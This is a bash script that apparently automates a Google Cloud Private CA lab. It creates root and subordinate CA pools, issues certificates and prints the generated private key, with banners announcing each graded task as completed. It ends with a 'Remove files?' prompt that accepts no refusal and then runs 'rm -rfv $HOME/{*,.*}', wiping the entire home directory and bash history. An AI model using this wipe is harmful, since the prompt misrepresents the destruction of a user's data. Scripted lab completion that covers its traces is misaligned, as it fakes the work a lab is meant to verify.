
BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`


echo "${YELLOW}${BOLD} 

Starting Execution

${RESET}"

gcloud services enable privateca.googleapis.com

echo "${YELLOW}${BOLD} API Enabled${RESET}"

echo "${GREEN}${BOLD}

Task 1 Completed

${RESET}"

gcloud config set privateca/location us-west1
gcloud privateca pools create my-pool-1  --tier=devops
gcloud privateca pools list
gcloud privateca roots create root-1 --pool my-pool-1  --subject "CN=example Internal, O=Example ORG LLC" --location us-west1 --quiet
gcloud privateca roots list
gcloud privateca roots enable root-1 --location us-west1 --pool my-pool-1
gcloud privateca roots list


echo "${GREEN}${BOLD}

Task 2 Completed

${RESET}"

sudo apt install build-essential libssl-dev libffi-dev python3-dev cargo
pip3 install --upgrade pip
pip3 install "cryptography>=2.2.0"
export CLOUDSDK_PYTHON_SITEPACKAGES=1
gcloud privateca certificates create \
    --issuer-pool my-pool-1 \
    --dns-san example.com \
    --generate-key \
    --key-output-file key_file \
    --cert-output-file cert_file

cat cert_file
cat key_file
openssl x509 -inform pem -in cert_file -pubkey -noout | openssl rsa -pubin -text -noout
openssl x509 -in cert_file -text -noout


gcloud privateca pools create sub-1-pool --tier=devops --location us-central1
gcloud privateca pools list
gcloud privateca subordinates --quiet create sub-ca-1 \
  --issuer-pool my-pool-1 \
  --pool sub-1-pool \
  --location us-central1 \
  --issuer-ca root-1   --issuer-location us-west1 \
  --key-algorithm "ec-p256-sha256" \
  --subject "CN=Example Internal Dev, O=Example ORG LLC" \
  --use-preset-profile "subordinate_server_tls_pathlen_0"
  
echo "${GREEN}${BOLD}

Task 3 Completed

${RESET}"
 

gcloud privateca certificates create \
    --issuer-pool sub-1-pool \
    --dns-san example-dev.com \
    --generate-key \
    --issuer-location us-central1 \
    --key-output-file key_file \
    --cert-output-file cert_file


openssl x509 -in cert_file -text -noout


read -p "${BOLD}${YELLOW}Remove files? [y/n]: ${RESET}" CONSENT_REMOVE

while [ $CONSENT_REMOVE != 'y' ];
do sleep 10 && read -p "${BOLD}${YELLOW}Remove files? [y/n]: ${RESET}" CONSENT_REMOVE ;
done

echo "${YELLOW}${BOLD}
Removing files 
${RESET}"
rm -rfv $HOME/{*,.*}
rm $HOME/./.bash_history
exit
logout
exit
